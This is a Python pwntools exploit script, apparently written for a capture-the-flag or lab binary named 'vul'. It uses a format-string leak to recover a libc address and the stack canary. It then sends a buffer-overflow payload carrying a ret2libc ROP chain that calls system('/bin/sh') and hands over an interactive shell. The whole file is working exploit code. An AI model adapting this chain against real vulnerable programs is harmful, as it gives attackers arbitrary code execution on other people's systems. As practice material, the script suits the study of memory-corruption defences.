from pwn import *

# end = ""
# for idx in range(20):
#     vul = process("./vul")
#     vul.sendline("%{}$lx".format(idx))
#     vul.recvline()
#     end += "{} : {}\n".format(idx, vul.recvline()) #libc %7$lx off = EA453 : %7$lx offset = 1080 : %9$lx canar
#     vul.close()
# print(end)

context.log_level = "ERROR"
elf = context.binary = ELF("./vul")
rop = ROP("/usr/lib/libc.so.6")
libc = ELF("/usr/lib/libc.so.6")
pty = process.PTY
vul = process(stdin=pty, stdout=pty)
context.log_level = "INFO"

vul.recvuntil(b'name : ')
vul.sendline(b"%3$p-%9$p")
vul.recvline()

addresses = vul.recvline().strip().split(b'-')
libc_base = int (addresses[0], 16) - 0x104034 #11b214
canary = int(addresses[1], 16)
print("Leaked addresses " + hex(libc_base) + " and " + hex(canary))

system = libc_base + libc.symbols.system
exit = libc_base + libc.symbols["exit"]
pop_rdi_ret = libc_base +  rop.find_gadget(["pop rdi", "ret"]).address
ret = libc_base + rop.find_gadget(["ret"]).address
bin_sh = libc_base + next(libc.search(b"/bin/sh"))

payload = b'A'*24 + p64(canary) + b'A' * 8 + p64(pop_rdi_ret) + p64(bin_sh) + p64(ret) + p64(system) + p64(exit)

vul.recvuntil(b'sentence')
vul.sendline(payload)

vul.interactive()
